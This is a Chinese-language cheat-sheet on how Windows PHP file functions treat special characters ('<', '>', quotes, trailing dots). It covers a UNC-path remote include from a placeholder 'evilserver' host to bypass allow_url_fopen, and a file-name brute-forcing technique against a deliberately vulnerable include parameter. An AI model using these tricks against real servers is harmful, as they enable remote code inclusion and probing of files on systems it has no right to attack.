# windows下的php文件访问及上传cheat-sheet

原文: Oddities of PHP file access in Windows®.Cheat-sheet. 

## 测试环境

 PHP 4.9, PHP 5.2, PHP 5.3, PHP 6.0.Operating systems that were tested: Windows XP SP3 x32, Windows XP SP2 x64, Windows 7,Windows Server 2003. 



当然基本上所有的php版本和windows系统都适用





## cheat-sheet

### windows对大小写不敏感

1.php<=>1.pHp

### '<'被替换成'*'

`include('shell<')`相当于`include('shell*')`,但是有时候<会不起作用,为了保证被替换成*,应该用`<<`

### '>'被替换成'?'

`include('file.p>p')`=>`include('file.p?p')`



 During the trace of call stack it was found out that thecharacter > gets replaced with ?, character < transforms to *, and " (double quote) is replaced by a .(dot). 

![table1.jpg](http://ww1.sinaimg.cn/large/006pWR9aly1g8i9c2dzi0j30p60n5tb4.jpg)



### `"` 会被替换成`.`

`include('evil"php')`=>`include('evil.php')`



### 读取'zzz'相当于读取'.zzz'

`fopen('htaccess')`=>`fopen('.htaccess')`

但是在我的win10电脑上却没有测试成功

### 文件名结尾为.那么前面任何`.,\,/`都会被忽略

```php
fopen("config.ini\\.//\/\/\/.");
fopen("config.ini\./.\.");
fopen("config.ini\\\.");
fopen("config.ini...............");
必须以点结尾
```

emmmm前面三个在win10下无效

### \\\\绕过allow_url_fopen=Off,来rfi

` include ('\\evilserver\shell.php'); `

这里貌似无法设置端口号

/////不知道怎么利用////////

用wireshark抓包后发现，会去访问139和445端口

或许每个windows系统的vps就能利用了

### 'c:flag'=='c:\flag'

` file_get_contents('C:boot.ini'); is equal to file_get_contents ('C:/boot.ini'); `



### dos短文件名

在win10下每测试成功



## 利用<<生成的通配符来爆破文件名



假设存在这这样一个文件test.php

```php
<?phpfile_get_contents("/images/".$_GET['a'].".jpg");
//or another function from Table 1, i.e. include().
?>
```

当请求为:test.php?a=../a<

当返回

` Warning: include(/images/../a<) [function.include]: failed to open stream: Invalid argument in `

时代表不存在a开头的文件或文件夹

当返回

` Warning: include(/images/../a<) [function.include]:  failed to open stream: Permission denied
 `

说明存在a开头的文件或文件夹

